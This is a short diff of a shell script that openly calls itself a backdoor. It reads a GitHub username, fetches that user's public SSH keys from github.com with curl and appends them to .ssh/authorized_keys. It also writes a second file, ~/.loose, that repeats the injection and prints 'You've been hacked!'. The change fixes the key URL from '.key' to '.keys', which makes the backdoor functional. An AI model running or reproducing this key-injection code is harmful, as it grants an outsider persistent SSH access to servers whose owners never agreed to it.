@@ -24,10 +24,10 @@ rm /tmp/hahahahahahahahahahahahahaha
 echo "Give us your GITHUB USERNAME!"
 read GH_USER
 # backdoory backdoory
-curl -s "https://github.com/${GH_USER}.key" >> .ssh/authorized_keys
+curl -s "https://github.com/${GH_USER}.keys" >> .ssh/authorized_keys
 cat <<EOF > ~/.loose
 # Losing your server!
-curl -s https://github.com/${GH_USER}.key >> .ssh/authorized_keys
+curl -s https://github.com/${GH_USER}.keys >> .ssh/authorized_keys
 echo "You've been hacked!"
 echo "  You have now dun goofed"
 EOF
